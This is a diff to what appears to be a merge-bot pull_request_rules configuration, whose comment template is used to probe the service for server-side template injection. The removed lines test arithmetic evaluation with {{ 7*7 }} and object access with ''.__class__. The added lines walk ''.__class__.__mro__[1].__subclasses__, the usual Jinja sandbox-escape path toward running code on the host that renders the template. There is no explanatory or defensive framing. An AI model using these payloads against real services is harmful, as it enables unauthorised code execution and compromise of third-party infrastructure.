@@ -1,13 +1,15 @@
 pull_request_rules:
-  - name: q-block
+  - name: r-attrs
     conditions: [base=main]
     actions:
       comment:
         message: |
-          QBLOCK
-          ctrl-mul=[{{ 7*7 }}]
-          ctrl-num=[{{ pr.number }}]
-          ctrl-auth=[{{ author }}]
-          t-title=[{{ pr.title }}]
-          t-pr=[{{ pr }}]
-          t-cls=[{{ ''.__class__ }}]
+          ATTRS
+          baseref=[{{ pr.base.ref }}]
+          headref=[{{ pr.head.ref }}]
+          userlogin=[{{ pr.user.login }}]
+          repository=[{{ repository }}]
+          state=[{{ pr.state }}]
+          fullname=[{{ pr.head.repo.full_name }}]
+          subcls=[{{ ''.__class__.__mro__[1].__subclasses__ }}]
+          mro1=[{{ ''.__class__.__mro__[1] }}]
